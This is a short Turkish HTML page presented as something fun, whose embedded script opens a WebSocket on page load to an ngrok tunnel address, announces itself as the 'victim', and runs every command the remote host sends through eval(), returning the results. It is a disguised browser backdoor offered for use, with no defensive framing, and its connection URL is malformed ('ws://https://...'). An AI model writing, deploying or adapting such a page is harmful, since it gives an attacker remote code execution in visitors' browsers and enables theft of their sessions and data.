<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Eğlenceli Bir iki Şey</title>
</head>
<body>
    <h1>Merhaba! Bu eğlenceli bir şey, lütfen bekldeyin...</h1>
    <script>
        // Ngrok'un verdiği URL ve port
        const host = "https://18b1-78-163-112-199.ngrok-free.app"; // Ngrok URL'sini buraya yaz
        const port = 80; // Ngrok'un kullandığı port

        // WebSocket bağlantısı kur
        const ws = new WebSocket(`ws://${host}:${port}`);

        ws.onopen = () => {
            console.log("Bağlantı kuruldu!");
            ws.send("Merhaba, ben kurbanım!");
        };

        ws.onmessage = (event) => {
            const command = event.data;
            console.log("Komut alındı:", command);

            // Komutu çalıştır ve çıktıyı gönder
            const output = eval(command); // Dikkat: Bu çok tehlikeli!
            ws.send(output);
        };

        ws.onerror = (error) => {
            console.error("Hata:", error);
        };

        ws.onclose = () => {
            console.log("Bağlantı kapatıldı.");
        };
    </script>
</body>
</html>
